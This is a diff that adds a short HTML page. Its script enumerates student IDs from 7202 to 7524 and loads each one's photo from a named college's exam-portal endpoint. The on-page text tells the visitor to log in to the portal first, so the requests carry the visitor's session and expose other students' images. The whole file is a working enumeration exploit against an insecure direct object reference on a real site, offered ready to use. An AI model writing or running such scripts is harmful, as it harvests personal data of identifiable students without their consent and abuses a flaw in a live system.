@@ -1,0 +1,21 @@
+<html>
+<script>
+
+	function fun()
+	{
+		for(var i=7202;i<7525;i++)
+		{	
+			var a = document.createElement("img");
+    			a.src = "https://exams.mlrinstitutions.ac.in/StudentLogin/Student/StudentPhoto.aspx?StudId="+i;
+    			document.body.appendChild(a);
+		}
+	}
+</script>
+<body>
+	<button onclick="fun()">click me</button>
+	<h5>if images are not load plz login to 
+	</h5>
+	<a href="https://exams.mlrinstitutions.ac.in/"> exam portal </a>
+	<h5> and refresh this page</h5>
+</body>
+</html>
